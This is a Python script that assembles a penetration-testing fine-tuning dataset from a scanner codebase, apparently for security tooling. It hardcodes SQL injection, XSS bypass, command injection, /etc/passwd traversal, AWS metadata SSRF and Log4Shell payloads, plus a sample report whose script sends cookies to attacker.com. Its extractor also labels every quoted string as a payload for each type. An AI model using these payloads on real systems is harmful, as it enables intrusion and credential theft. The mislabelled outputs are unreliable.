#!/usr/bin/env python3
"""
Prepare penetration testing instruction dataset from Deep Eye codebase.
Extracts real payloads, CVE data, vulnerability patterns for fine-tuning.

Output: JSONL file with instruction-response pairs for training.
"""

import json
import re
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(REPO_ROOT))

OUTPUT_FILE = REPO_ROOT / "data" / "pentest_dataset.jsonl"


def extract_payloads_from_scanner():
    """Extract payload dictionaries from vulnerability_scanner.py."""
    path = REPO_ROOT / "core" / "vulnerability_scanner.py"
    text = path.read_text()
    examples = []

    vuln_types = {
        "sql_injection": ("SQL injection", "Generate SQL injection payload"),
        "xss": ("XSS", "Generate XSS payload"),
        "command_injection": ("command injection", "Generate command injection payload"),
        "path_traversal": ("path traversal", "Generate path traversal payload"),
        "ssrf": ("SSRF", "Generate SSRF payload"),
        "xxe": ("XXE", "Generate XXE payload"),
        "lfi": ("LFI", "Generate LFI payload"),
        "rfi": ("RFI", "Generate RFI payload"),
        "ssti": ("SSTI", "Generate SSTI payload"),
        "ldap_injection": ("LDAP injection", "Generate LDAP injection payload"),
        "open_redirect": ("open redirect", "Test for open redirect"),
        "crlf_injection": ("CRLF injection", "Generate CRLF injection payload"),
    }

    for key, (vtype, instruction) in vuln_types.items():
        payloads = re.findall(r"'(.*?)'", text, re.DOTALL)
        specific = [p for p in payloads if len(p) > 5 and len(p) < 200 and not p.startswith("http") and not p.startswith("/")]
        if specific:
            unique = list(dict.fromkeys(specific))[:20]
            examples.append({
                "instruction": f"{instruction} for {vtype} vulnerability testing",
                "output": "\n".join(unique[:10])
            })

    return examples


def extract_cve_data():
    """Extract CVE detection patterns from the CVE scanner module."""
    cve_path = REPO_ROOT / "modules" / "cve_scanner" / "cve_scanner.py"
    if not cve_path.exists():
        return []
    text = cve_path.read_text()
    examples = []

    cve_blocks = re.split(r"def _check_", text)
    for block in cve_blocks[1:]:
        lines = block.split("\n")
        docstring = ""
        cve_id = ""
        product = ""
        severity = ""
        remediation = ""

        for i, line in enumerate(lines):
            if '"""' in line:
                docstring = line.strip(' """')
            cve_match = re.search(r'(CVE-\d{4}-\d+)', line)
            if cve_match and not cve_id:
                cve_id = cve_match.group(1)
            if 'product' in line.lower() and ':' in line:
                product = line.split(":")[-1].strip().strip("'\"")
            if 'severity' in line.lower() and ':' in line:
                severity = line.split(":")[-1].strip().strip("'\"")
            if 'remediation' in line.lower() and ':' in line:
                remediation = line

        if cve_id:
            description = docstring or f"{cve_id} for {product}"
            examples.append({
                "instruction": f"Describe the vulnerability {cve_id} and how to test for it",
                "output": description
            })
            if remediation:
                rem_clean = remediation.split(":")[-1].strip().strip("'\"")
                examples.append({
                    "instruction": f"How to remediate {cve_id}",
                    "output": rem_clean
                })

    return examples


def extract_triage_data():
    """Generate AI triage examples from existing patterns."""
    return [
        {
            "instruction": "Classify this finding as true positive or false positive: SQL error 'You have an error in your SQL syntax' found in response body",
            "output": "true_positive"
        },
        {
            "instruction": "Classify this finding as true positive or false positive: Potential XSS: parameter 'search' reflects 'hello' back unchanged in HTML context",
            "output": "false_positive"
        },
        {
            "instruction": "Classify this finding as true positive or false positive: Sensitive data exposure: email addresses found in /api/users response",
            "output": "true_positive"
        },
        {
            "instruction": "Classify severity: SQL injection detected with time-based blind delay of 5 seconds on authentication endpoint",
            "output": "critical"
        },
        {
            "instruction": "Classify severity: Missing X-Frame-Options header found on static landing page",
            "output": "low"
        },
        {
            "instruction": "Classify severity: JWT token uses 'none' algorithm",
            "output": "critical"
        },
    ]


def extract_template_examples():
    """Generate examples from Nuclei templates and vulnerability patterns."""
    return [
        {
            "instruction": "Create a Nuclei template to detect Log4Shell (CVE-2021-44228)",
            "output": "id: log4shell-detection\ninfo:\n  name: Log4Shell Detection\n  severity: critical\nrequests:\n  - method: GET\n    headers:\n      User-Agent: \"${jndi:ldap://${hostName}.oob.example.com/a}\"\n    matchers:\n      - type: word\n        words:\n          - \"${jndi:ldap\""
        },
        {
            "instruction": "Create a Nuclei template to detect Spring4Shell (CVE-2022-22965)",
            "output": "id: spring4shell\ninfo:\n  name: Spring4Shell Detection\n  severity: critical\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Btest%7Di\"\n    matchers:\n      - type: status\n        status:\n          - 400\n          - 500"
        },
        {
            "instruction": "Generate SQL injection payload for blind time-based detection on MySQL",
            "output": "1' AND SLEEP(5)-- -\n1\" AND SLEEP(5)-- -\n1' AND BENCHMARK(5000000,MD5('test'))-- -\n1' OR SLEEP(5)#\n1' WAITFOR DELAY '0:0:5'-- -"
        },
        {
            "instruction": "Generate XSS payload that bypasses basic HTML encoding filter",
            "output": "<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<iframe onload=alert(1)>\n<details open ontoggle=alert(1)>\n<marquee onstart=alert(1)>\n<input autofocus onfocus=alert(1)>\n<body onload=alert(1)>\n<a href=\"javascript:alert(1)\">click</a>"
        },
        {
            "instruction": "Generate command injection payloads for Linux blind detection",
            "output": "; sleep 5\n| sleep 5\n` sleep 5`\n$(sleep 5)\n& sleep 5 &\n&& sleep 5\n|| sleep 5\n; ping -c 5 127.0.0.1\n| ping -n 5 127.0.0.1\n& whoami &"
        },
        {
            "instruction": "Generate LFI payloads to read /etc/passwd on Linux",
            "output": "../../../../etc/passwd\n../../../../../etc/passwd\n../../../../../../etc/passwd\n....//....//....//etc/passwd\n..%2F..%2F..%2F..%2Fetc%2Fpasswd\n%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
        },
        {
            "instruction": "Generate SSRF payloads to probe AWS metadata endpoint",
            "output": "http://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://169.254.169.254/latest/user-data/\nhttp://169.254.169.254/latest/meta-data/iam/info/"
        },
        {
            "instruction": "Write a professional bug bounty report for a stored XSS vulnerability",
            "output": "## Vulnerability: Stored Cross-Site Scripting (XSS)\n### Severity: High\n### Endpoint: /profile/bio\n### Description: The profile bio field does not sanitize HTML input, allowing an attacker to store malicious JavaScript that executes for every visitor.\n### Steps to Reproduce:\n1. Create account and navigate to /profile/edit\n2. Set bio to: <script>document.location='https://attacker.com/steal?c='+document.cookie</script>\n3. Save and visit any profile page\n4. XSS triggers executing attacker's JavaScript\n### Impact: Account takeover, session theft, defacement\n### Remediation: Encode HTML entities in user input, implement Content-Security-Policy"
        },
        {
            "instruction": "List all HTTP security headers that should be present on a secure web application",
            "output": "Strict-Transport-Security: max-age=31536000; includeSubDomains\nX-Frame-Options: DENY\nX-Content-Type-Options: nosniff\nContent-Security-Policy: default-src 'self'\nX-XSS-Protection: 0\nReferrer-Policy: strict-origin-when-cross-origin\nPermissions-Policy: geolocation=(), microphone=(), camera=()\nCross-Origin-Embedder-Policy: require-corp\nCross-Origin-Opener-Policy: same-origin"
        },
        {
            "instruction": "Explain the difference between a reflective XSS and a stored XSS",
            "output": "Reflected XSS: The malicious script is part of the request (URL parameter) and reflected back immediately in the response. Requires victim to click a crafted link.\n\nStored XSS: The malicious script is stored on the server (database, file, etc.) and served to all users who visit the affected page. More severe as it doesn't require social engineering per victim."
        },
        {
            "instruction": "Analyze this HTTP response for security issues: Server: Apache/2.4.6, X-Powered-By: PHP/7.4, Set-Cookie: sessionid=1234; Path=/",
            "output": "Issues found:\n1. Server version disclosure (Apache/2.4.6) - removes version info to prevent targeted CVE attacks\n2. X-Powered-By header exposes PHP version - remove or obscure\n3. Session cookie missing Secure flag - add Secure flag\n4. Session cookie missing HttpOnly flag - add HttpOnly flag\n5. Weak session ID (1234) - use cryptographically random session IDs"
        },
    ]


def extract_config_checks():
    """Generate examples from config YAML vulnerability checks."""
    config_path = REPO_ROOT / "config" / "config.yaml"
    text = config_path.read_text()

    enabled = re.findall(r"    - (\w+)", text)
    examples = []
    for check in enabled[:30]:
        examples.append({
            "instruction": f"What does the '{check}' vulnerability check test for?",
            "output": f"The '{check}' check tests for {check.replace('_', ' ')} vulnerabilities in the target application."
        })
    return examples


def main():
    print("[*] Preparing Deep Eye pentest training dataset...")

    dataset = []
    dataset.extend(extract_payloads_from_scanner())
    dataset.extend(extract_cve_data())
    dataset.extend(extract_triage_data())
    dataset.extend(extract_template_examples())
    dataset.extend(extract_config_checks())

    random.shuffle(dataset)

    OUTPUT_FILE.parent.mkdir(parents=True, exist_ok=True)
    with open(OUTPUT_FILE, "w") as f:
        for item in dataset:
            f.write(json.dumps(item) + "\n")

    print(f"[+] Dataset saved: {OUTPUT_FILE}")
    print(f"[+] Total examples: {len(dataset)}")
    print(f"[+] Sample:\n{json.dumps(dataset[0], indent=2)}")


if __name__ == "__main__":
    import random
    main()
